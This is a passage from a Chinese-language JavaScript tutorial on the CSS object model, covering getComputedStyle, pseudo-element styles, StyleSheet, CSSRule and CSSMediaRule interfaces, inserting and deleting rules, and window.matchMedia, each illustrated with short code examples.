<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;elem-container&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> styleObj = <span class="built_in">window</span>.getComputedStyle(elem, <span class="literal">null</span>)</span><br><span class="line"><span class="keyword">var</span> height = styleObj.height;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> height = styleObj[<span class="string">&#x27;height&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> height = styleObj.getPropertyValue(<span class="string">&#x27;height&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码得到的<code>height</code>属性，是浏览器最终渲染出来的高度，比其他方法得到的高度更可靠。由于<code>styleObj</code>是 CSSStyleDeclaration 实例，所以可以使用各种 CSSStyleDeclaration 的实例属性和方法。</p>
<p>有几点需要注意。</p>
<ul>
<li>CSSStyleDeclaration 实例返回的 CSS 值都是绝对单位。比如，长度都是像素单位（返回值包括<code>px</code>后缀），颜色是<code>rgb(#, #, #)</code>或<code>rgba(#, #, #, #)</code>格式。</li>
<li>CSS 规则的简写形式无效。比如，想读取<code>margin</code>属性的值，不能直接读，只能读<code>marginLeft</code>、<code>marginTop</code>等属性；再比如，<code>font</code>属性也是不能直接读的，只能读<code>font-size</code>等单个属性。</li>
<li>如果读取 CSS 原始的属性名，要用方括号运算符，比如<code>styleObj[&#39;z-index&#39;]</code>；如果读取骆驼拼写法的 CSS 属性名，可以直接读取<code>styleObj.zIndex</code>。</li>
<li>该方法返回的 CSSStyleDeclaration 实例的<code>cssText</code>属性无效，返回<code>undefined</code>。</li>
</ul>
<h4 id="9-6-CSS-伪元素"><a href="#9-6-CSS-伪元素" class="headerlink" title="9.6 CSS 伪元素"></a>9.6 CSS 伪元素</h4><p>CSS 伪元素是通过 CSS 向 DOM 添加的元素，主要是通过<code>:before</code>和<code>:after</code>选择器生成，然后用<code>content</code>属性指定伪元素的内容。</p>
<p>下面是一段 HTML 代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;test&quot;</span>&gt;Test content&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>CSS 添加伪元素<code>:before</code>的写法如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">#test:before &#123;</span><br><span class="line">  content: <span class="string">&#x27;Before &#x27;</span>;</span><br><span class="line">  color: #FF0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>节点元素的<code>style</code>对象无法读写伪元素的样式，这时就要用到<code>window.getComputedStyle()</code>。JavaScript 获取伪元素，可以使用下面的方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> test = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = <span class="built_in">window</span>.getComputedStyle(test, <span class="string">&#x27;:before&#x27;</span>).content;</span><br><span class="line"><span class="keyword">var</span> color = <span class="built_in">window</span>.getComputedStyle(test, <span class="string">&#x27;:before&#x27;</span>).color;</span><br></pre></td></tr></table></figure>
<p>此外，也可以使用 CSSStyleDeclaration 实例的<code>getPropertyValue</code>方法，获取伪元素的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="built_in">window</span>.getComputedStyle(test, <span class="string">&#x27;:before&#x27;</span>)</span><br><span class="line">  .getPropertyValue(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> color = <span class="built_in">window</span>.getComputedStyle(test, <span class="string">&#x27;:before&#x27;</span>)</span><br><span class="line">  .getPropertyValue(<span class="string">&#x27;color&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="9-7-StyleSheet-接口"><a href="#9-7-StyleSheet-接口" class="headerlink" title="9.7 StyleSheet 接口"></a>9.7 StyleSheet 接口</h4><h5 id="9-7-1-概述"><a href="#9-7-1-概述" class="headerlink" title="9.7.1 概述"></a>9.7.1 概述</h5><p><code>StyleSheet</code>接口代表网页的一张样式表，包括<code>&lt;link&gt;</code>元素加载的样式表和<code>&lt;style&gt;</code>元素内嵌的样式表。</p>
<p><code>document</code>对象的<code>styleSheets</code>属性，可以返回当前页面的所有<code>StyleSheet</code>实例（即所有样式表）。它是一个类似数组的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sheets = <span class="built_in">document</span>.styleSheets;</span><br><span class="line"><span class="keyword">var</span> sheet = <span class="built_in">document</span>.styleSheets[<span class="number">0</span>];</span><br><span class="line">sheet <span class="keyword">instanceof</span> StyleSheet <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>如果是<code>&lt;style&gt;</code>元素嵌入的样式表，还有另一种获取<code>StyleSheet</code>实例的方法，就是这个节点元素的<code>sheet</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为 &lt;style id=&quot;myStyle&quot;&gt;&lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> myStyleSheet = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myStyle&#x27;</span>).sheet;</span><br><span class="line">myStyleSheet <span class="keyword">instanceof</span> StyleSheet <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>严格地说，<code>StyleSheet</code>接口不仅包括网页样式表，还包括 XML 文档的样式表。所以，它有一个子类<code>CSSStyleSheet</code>表示网页的 CSS 样式表。我们在网页里面拿到的样式表实例，实际上是<code>CSSStyleSheet</code>的实例。这个子接口继承了<code>StyleSheet</code>的所有属性和方法，并且定义了几个自己的属性，下面把这两个接口放在一起介绍。</p>
<h5 id="9-7-2-实例属性"><a href="#9-7-2-实例属性" class="headerlink" title="9.7.2 实例属性"></a>9.7.2 实例属性</h5><p><code>StyleSheet</code>实例有以下属性。</p>
<h6 id="1-StyleSheet-disabled"><a href="#1-StyleSheet-disabled" class="headerlink" title="(1) StyleSheet.disabled"></a>(1) StyleSheet.disabled</h6><p><code>StyleSheet.disabled</code>返回一个布尔值，表示该样式表是否处于禁用状态。手动设置<code>disabled</code>属性为<code>true</code>，等同于在<code>&lt;link&gt;</code>元素里面，将这张样式表设为<code>alternate stylesheet</code>，即该样式表将不会生效。</p>
<p>注意，<code>disabled</code>属性只能在 JavaScript 脚本中设置，不能在 HTML 语句中设置。</p>
<h6 id="2-Stylesheet-href"><a href="#2-Stylesheet-href" class="headerlink" title="(2) Stylesheet.href"></a>(2) Stylesheet.href</h6><p><code>Stylesheet.href</code>返回样式表的网址。对于内嵌样式表，该属性返回<code>null</code>。该属性只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.styleSheets[<span class="number">0</span>].href</span><br></pre></td></tr></table></figure>
<h6 id="3-StyleSheet-media"><a href="#3-StyleSheet-media" class="headerlink" title="(3) StyleSheet.media"></a>(3) StyleSheet.media</h6><p><code>StyleSheet.media</code>属性返回一个类似数组的对象（<code>MediaList</code>实例），成员是表示适用媒介的字符串。表示当前样式表是用于屏幕（screen），还是用于打印（print）或手持设备（handheld），或各种媒介都适用（all）。该属性只读，默认值是<code>screen</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.styleSheets[<span class="number">0</span>].media.mediaText</span><br><span class="line"><span class="comment">// &quot;all&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>MediaList</code>实例的<code>appendMedium</code>方法，用于增加媒介；<code>deleteMedium</code>方法用于删除媒介。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.styleSheets[<span class="number">0</span>].media.appendMedium(<span class="string">&#x27;handheld&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.styleSheets[<span class="number">0</span>].media.deleteMedium(<span class="string">&#x27;print&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h6 id="4-StyleSheet-title"><a href="#4-StyleSheet-title" class="headerlink" title="(4) StyleSheet.title"></a>(4) StyleSheet.title</h6><p><code>StyleSheet.title</code>属性返回样式表的<code>title</code>属性。</p>
<h6 id="5-StyleSheet-type"><a href="#5-StyleSheet-type" class="headerlink" title="(5) StyleSheet.type"></a>(5) StyleSheet.type</h6><p><code>StyleSheet.type</code>属性返回样式表的<code>type</code>属性，通常是<code>text/css</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.styleSheets[<span class="number">0</span>].type  <span class="comment">// &quot;text/css&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="6-StyleSheet-parentStyleSheet"><a href="#6-StyleSheet-parentStyleSheet" class="headerlink" title="(6) StyleSheet.parentStyleSheet"></a>(6) StyleSheet.parentStyleSheet</h6><p>CSS 的<code>@import</code>命令允许在样式表中加载其他样式表。<code>StyleSheet.parentStyleSheet</code>属性返回包含了当前样式表的那张样式表。如果当前样式表是顶层样式表，则该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (stylesheet.parentStyleSheet) &#123;</span><br><span class="line">  sheet = stylesheet.parentStyleSheet;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  sheet = stylesheet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="7-StyleSheet-ownerNode"><a href="#7-StyleSheet-ownerNode" class="headerlink" title="(7) StyleSheet.ownerNode"></a>(7) StyleSheet.ownerNode</h6><p><code>StyleSheet.ownerNode</code>属性返回<code>StyleSheet</code>对象所在的 DOM 节点，通常是<code>&lt;link&gt;</code>或<code>&lt;style&gt;</code>。对于那些由其他样式表引用的样式表，该属性为<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML代码为</span></span><br><span class="line"><span class="comment">// &lt;link rel=&quot;StyleSheet&quot; href=&quot;example.css&quot; type=&quot;text/css&quot; /&gt;</span></span><br><span class="line"><span class="built_in">document</span>.styleSheets[<span class="number">0</span>].ownerNode <span class="comment">// [object HTMLLinkElement]</span></span><br></pre></td></tr></table></figure>
<h6 id="8-CSSStyleSheet-cssRules"><a href="#8-CSSStyleSheet-cssRules" class="headerlink" title="(8) CSSStyleSheet.cssRules"></a>(8) CSSStyleSheet.cssRules</h6><p><code>CSSStyleSheet.cssRules</code>属性指向一个类似数组的对象（<code>CSSRuleList</code>实例），里面每一个成员就是当前样式表的一条 CSS 规则。使用该规则的<code>cssText</code>属性，可以得到 CSS 规则对应的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sheet = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#styleElement&#x27;</span>).sheet;</span><br><span class="line"></span><br><span class="line">sheet.cssRules[<span class="number">0</span>].cssText</span><br><span class="line"><span class="comment">// &quot;body &#123; background-color: red; margin: 20px; &#125;&quot;</span></span><br><span class="line"></span><br><span class="line">sheet.cssRules[<span class="number">1</span>].cssText</span><br><span class="line"><span class="comment">// &quot;p &#123; line-height: 1.4em; color: blue; &#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>每条 CSS 规则还有一个<code>style</code>属性，指向一个对象，用来读写具体的 CSS 命令。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cssStyleSheet.cssRules[<span class="number">0</span>].style.color = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">cssStyleSheet.cssRules[<span class="number">1</span>].style.color = <span class="string">&#x27;purple&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h6 id="9-CSSStyleSheet-ownerRule"><a href="#9-CSSStyleSheet-ownerRule" class="headerlink" title="(9) CSSStyleSheet.ownerRule"></a>(9) CSSStyleSheet.ownerRule</h6><p>有些样式表是通过<code>@import</code>规则输入的，它的<code>ownerRule</code>属性会返回一个<code>CSSRule</code>实例，代表那行<code>@import</code>规则。如果当前样式表不是通过<code>@import</code>引入的，<code>ownerRule</code>属性返回<code>null</code>。</p>
<h5 id="9-7-3-实例方法"><a href="#9-7-3-实例方法" class="headerlink" title="9.7.3 实例方法"></a>9.7.3 实例方法</h5><p>######（1）CSSStyleSheet.insertRule()</p>
<p><code>CSSStyleSheet.insertRule</code>方法用于在当前样式表的插入一个新的 CSS 规则。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sheet = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#styleElement&#x27;</span>).sheet;</span><br><span class="line">sheet.insertRule(<span class="string">&#x27;#block &#123; color: white &#125;&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">sheet.insertRule(<span class="string">&#x27;p &#123; color: red &#125;&#x27;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>该方法可以接受两个参数，第一个参数是表示 CSS 规则的字符串，这里只能有一条规则，否则会报错。第二个参数是该规则在样式表的插入位置（从0开始），该参数可选，默认为0（即默认插在样式表的头部）。注意，如果插入位置大于现有规则的数目，会报错。</p>
<p>该方法的返回值是新插入规则的位置序号。</p>
<p>注意，浏览器对脚本在样式表里面插入规则有很多限制。所以，这个方法最好放在<code>try...catch</code>里使用。</p>
<h6 id="（2）CSSStyleSheet-deleteRule"><a href="#（2）CSSStyleSheet-deleteRule" class="headerlink" title="（2）CSSStyleSheet.deleteRule()"></a>（2）CSSStyleSheet.deleteRule()</h6><p><code>CSSStyleSheet.deleteRule</code>方法用来在样式表里面移除一条规则，它的参数是该条规则在<code>cssRules</code>对象中的位置。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.styleSheets[<span class="number">0</span>].deleteRule(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h4 id="9-8-实例：添加样式表"><a href="#9-8-实例：添加样式表" class="headerlink" title="9.8 实例：添加样式表"></a>9.8 实例：添加样式表</h4><p>网页添加样式表有两种方式。一种是添加一张内置样式表，即在文档中添加一个<code>&lt;style&gt;</code>节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.createElement(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">style.setAttribute(<span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;screen&#x27;</span>);</span><br><span class="line">style.innerHTML = <span class="string">&#x27;body&#123;color:red&#125;&#x27;</span>;</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(style);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> style = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> style = <span class="built_in">document</span>.createElement(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">  <span class="built_in">document</span>.head.appendChild(style);</span><br><span class="line">  <span class="keyword">return</span> style;</span><br><span class="line">&#125;)();</span><br><span class="line">style.sheet.insertRule(<span class="string">&#x27;.foo&#123;color:red;&#125;&#x27;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>另一种是添加外部样式表，即在文档中添加一个<code>&lt;link&gt;</code>节点，然后将<code>href</code>属性指向外部样式表的 URL。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> linkElm = <span class="built_in">document</span>.createElement(<span class="string">&#x27;link&#x27;</span>);</span><br><span class="line">linkElm.setAttribute(<span class="string">&#x27;rel&#x27;</span>, <span class="string">&#x27;stylesheet&#x27;</span>);</span><br><span class="line">linkElm.setAttribute(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/css&#x27;</span>);</span><br><span class="line">linkElm.setAttribute(<span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;reset-min.css&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.head.appendChild(linkElm);</span><br></pre></td></tr></table></figure>
<h4 id="9-9-CSSRuleList-接口"><a href="#9-9-CSSRuleList-接口" class="headerlink" title="9.9 CSSRuleList 接口"></a>9.9 CSSRuleList 接口</h4><p>CSSRuleList 接口是一个类似数组的对象，表示一组 CSS 规则，成员都是 CSSRule 实例。</p>
<p>获取 CSSRuleList 实例，一般是通过<code>StyleSheet.cssRules</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   h1 &#123; color: red; &#125;</span></span><br><span class="line"><span class="comment">//   p &#123; color: blue; &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> myStyleSheet = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myStyle&#x27;</span>).sheet;</span><br><span class="line"><span class="keyword">var</span> crl = myStyleSheet.cssRules;</span><br><span class="line">crl <span class="keyword">instanceof</span> CSSRuleList <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>CSSRuleList 实例里面，每一条规则（CSSRule 实例）可以通过<code>rules.item(index)</code>或者<code>rules[index]</code>拿到。CSS 规则的条数通过<code>rules.length</code>拿到。还是用上面的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">crl[<span class="number">0</span>] <span class="keyword">instanceof</span> CSSRule <span class="comment">// true</span></span><br><span class="line">crl.length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>注意，添加规则和删除规则不能在 CSSRuleList 实例操作，而要在它的父元素 StyleSheet 实例上，通过<code>StyleSheet.insertRule()</code>和<code>StyleSheet.deleteRule()</code>操作。</p>
<h4 id="9-10-CSSRule-接口"><a href="#9-10-CSSRule-接口" class="headerlink" title="9.10 CSSRule 接口"></a>9.10 CSSRule 接口</h4><h5 id="9-10-1-概述"><a href="#9-10-1-概述" class="headerlink" title="9.10.1 概述"></a>9.10.1 概述</h5><p>一条 CSS 规则包括两个部分：CSS 选择器和样式声明。下面就是一条典型的 CSS 规则。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">.myClass &#123;</span><br><span class="line">  color: red;</span><br><span class="line">  background-color: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JavaScript 通过 CSSRule 接口操作 CSS 规则。一般通过 CSSRuleList 接口（<code>StyleSheet.cssRules</code>）获取 CSSRule 实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   .myClass &#123;</span></span><br><span class="line"><span class="comment">//     color: red;</span></span><br><span class="line"><span class="comment">//     background-color: yellow;</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> myStyleSheet = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myStyle&#x27;</span>).sheet;</span><br><span class="line"><span class="keyword">var</span> ruleList = myStyleSheet.cssRules;</span><br><span class="line"><span class="keyword">var</span> rule = ruleList[<span class="number">0</span>];</span><br><span class="line">rule <span class="keyword">instanceof</span> CSSRule <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="9-10-2-CSSRule-实例的属性"><a href="#9-10-2-CSSRule-实例的属性" class="headerlink" title="9.10.2 CSSRule 实例的属性"></a>9.10.2 CSSRule 实例的属性</h5><h6 id="（1）CSSRule-cssText"><a href="#（1）CSSRule-cssText" class="headerlink" title="（1）CSSRule.cssText"></a>（1）CSSRule.cssText</h6><p><code>CSSRule.cssText</code>属性返回当前规则的文本，还是使用上面的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rule.cssText</span><br><span class="line"><span class="comment">// &quot;.myClass &#123; color: red; background-color: yellow; &#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果规则是加载（<code>@import</code>）其他样式表，<code>cssText</code>属性返回<code>@import &#39;url&#39;</code>。</p>
<h6 id="（2）CSSRule-parentStyleSheet"><a href="#（2）CSSRule-parentStyleSheet" class="headerlink" title="（2）CSSRule.parentStyleSheet"></a>（2）CSSRule.parentStyleSheet</h6><p><code>CSSRule.parentStyleSheet</code>属性返回当前规则所在的样式表对象（StyleSheet 实例），还是使用上面的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rule.parentStyleSheet === myStyleSheet <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h6 id="（3）CSSRule-parentRule"><a href="#（3）CSSRule-parentRule" class="headerlink" title="（3）CSSRule.parentRule"></a>（3）CSSRule.parentRule</h6><p><code>CSSRule.parentRule</code>属性返回包含当前规则的父规则，如果不存在父规则（即当前规则是顶层规则），则返回<code>null</code>。</p>
<p>父规则最常见的情况是，当前规则包含在<code>@media</code>规则代码块之中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   @supports (display: flex) &#123;</span></span><br><span class="line"><span class="comment">//     @media screen and (min-width: 900px) &#123;</span></span><br><span class="line"><span class="comment">//       article &#123;</span></span><br><span class="line"><span class="comment">//         display: flex;</span></span><br><span class="line"><span class="comment">//       &#125;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> myStyleSheet = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myStyle&#x27;</span>).sheet;</span><br><span class="line"><span class="keyword">var</span> ruleList = myStyleSheet.cssRules;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rule0 = ruleList[<span class="number">0</span>];</span><br><span class="line">rule0.cssText</span><br><span class="line"><span class="comment">// &quot;@supports (display: flex) &#123;</span></span><br><span class="line"><span class="comment">//    @media screen and (min-width: 900px) &#123;</span></span><br><span class="line"><span class="comment">//      article &#123; display: flex; &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">// &#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于这条规则内嵌其他规则，</span></span><br><span class="line"><span class="comment">// 所以它有 cssRules 属性，且该属性是 CSSRuleList 实例</span></span><br><span class="line">rule0.cssRules <span class="keyword">instanceof</span> CSSRuleList <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rule1 = rule0.cssRules[<span class="number">0</span>];</span><br><span class="line">rule1.cssText</span><br><span class="line"><span class="comment">// &quot;@media screen and (min-width: 900px) &#123;</span></span><br><span class="line"><span class="comment">//   article &#123; display: flex; &#125;</span></span><br><span class="line"><span class="comment">// &#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rule2 = rule1.cssRules[<span class="number">0</span>];</span><br><span class="line">rule2.cssText</span><br><span class="line"><span class="comment">// &quot;article &#123; display: flex; &#125;&quot;</span></span><br><span class="line"></span><br><span class="line">rule1.parentRule === rule0 <span class="comment">// true</span></span><br><span class="line">rule2.parentRule === rule1 <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h6 id="（4）CSSRule-type"><a href="#（4）CSSRule-type" class="headerlink" title="（4）CSSRule.type"></a>（4）CSSRule.type</h6><p><code>CSSRule.type</code>属性返回一个整数值，表示当前规则的类型。</p>
<p>最常见的类型有以下几种。</p>
<ul>
<li>1：普通样式规则（CSSStyleRule 实例）</li>
<li>3：<code>@import</code>规则</li>
<li>4：<code>@media</code>规则（CSSMediaRule 实例）</li>
<li>5：<code>@font-face</code>规则</li>
</ul>
<h5 id="9-10-3CSSStyleRule-接口"><a href="#9-10-3CSSStyleRule-接口" class="headerlink" title="9.10.3CSSStyleRule 接口"></a>9.10.3CSSStyleRule 接口</h5><p>如果一条 CSS 规则是普通的样式规则（不含特殊的 CSS 命令），那么除了 CSSRule 接口，它还部署了 CSSStyleRule 接口。</p>
<p>CSSStyleRule 接口有以下两个属性。</p>
<h6 id="（1）CSSStyleRule-selectorText"><a href="#（1）CSSStyleRule-selectorText" class="headerlink" title="（1）CSSStyleRule.selectorText"></a>（1）CSSStyleRule.selectorText</h6><p><code>CSSStyleRule.selectorText</code>属性返回当前规则的选择器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stylesheet = <span class="built_in">document</span>.styleSheets[<span class="number">0</span>];</span><br><span class="line">stylesheet.cssRules[<span class="number">0</span>].selectorText <span class="comment">// &quot;.myClass&quot;</span></span><br></pre></td></tr></table></figure>
<p>注意，这个属性是可写的。</p>
<h6 id="（2）CSSStyleRule-style"><a href="#（2）CSSStyleRule-style" class="headerlink" title="（2）CSSStyleRule.style"></a>（2）CSSStyleRule.style</h6><p><code>CSSStyleRule.style</code>属性返回一个对象（CSSStyleDeclaration 实例），代表当前规则的样式声明，也就是选择器后面的大括号里面的部分。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   p &#123; color: red; &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> styleSheet = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myStyle&#x27;</span>).sheet;</span><br><span class="line">styleSheet.cssRules[<span class="number">0</span>].style <span class="keyword">instanceof</span> CSSStyleDeclaration</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>CSSStyleDeclaration 实例的<code>cssText</code>属性，可以返回所有样式声明，格式为字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">styleSheet.cssRules[<span class="number">0</span>].style.cssText</span><br><span class="line"><span class="comment">// &quot;color: red;&quot;</span></span><br><span class="line">styleSheet.cssRules[<span class="number">0</span>].selectorText</span><br><span class="line"><span class="comment">// &quot;p&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="9-10-4-CSSMediaRule-接口"><a href="#9-10-4-CSSMediaRule-接口" class="headerlink" title="9.10.4 CSSMediaRule 接口"></a>9.10.4 CSSMediaRule 接口</h5><p>如果一条 CSS 规则是<code>@media</code>代码块，那么它除了 CSSRule 接口，还部署了 CSSMediaRule 接口。</p>
<p>该接口主要提供<code>media</code>属性和<code>conditionText</code>属性。前者返回代表<code>@media</code>规则的一个对象（MediaList 实例），后者返回<code>@media</code>规则的生效条件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   @media screen and (min-width: 900px) &#123;</span></span><br><span class="line"><span class="comment">//     article &#123; display: flex; &#125;</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> styleSheet = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myStyle&#x27;</span>).sheet;</span><br><span class="line">styleSheet.cssRules[<span class="number">0</span>] <span class="keyword">instanceof</span> CSSMediaRule</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">styleSheet.cssRules[<span class="number">0</span>].media</span><br><span class="line"><span class="comment">//  &#123;</span></span><br><span class="line"><span class="comment">//    0: &quot;screen and (min-width: 900px)&quot;,</span></span><br><span class="line"><span class="comment">//    appendMedium: function,</span></span><br><span class="line"><span class="comment">//    deleteMedium: function,</span></span><br><span class="line"><span class="comment">//    item: function,</span></span><br><span class="line"><span class="comment">//    length: 1,</span></span><br><span class="line"><span class="comment">//    mediaText: &quot;screen and (min-width: 900px)&quot;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">styleSheet.cssRules[<span class="number">0</span>].conditionText</span><br><span class="line"><span class="comment">// &quot;screen and (min-width: 900px)&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="9-11-window-matchMedia"><a href="#9-11-window-matchMedia" class="headerlink" title="9.11 window.matchMedia()"></a>9.11 window.matchMedia()</h4><h5 id="9-11-1-基本用法"><a href="#9-11-1-基本用法" class="headerlink" title="9.11.1 基本用法"></a>9.11.1 基本用法</h5><p><code>window.matchMedia</code>方法用来将 CSS 的<code>MediaQuery</code>条件语句，转换成一个 MediaQueryList 实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mdl = <span class="built_in">window</span>.matchMedia(<span class="string">&#x27;(min-width: 400px)&#x27;</span>);</span><br><span class="line">mdl <span class="keyword">instanceof</span> MediaQueryList <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>mdl</code>就是 mediaQueryList 的实例。</p>
<p>注意，如果参数不是有效的<code>MediaQuery</code>条件语句，<code>window.matchMedia</code>不会报错，依然返回一个 MediaQueryList 实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.matchMedia(<span class="string">&#x27;bad string&#x27;</span>) <span class="keyword">instanceof</span> MediaQueryList <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
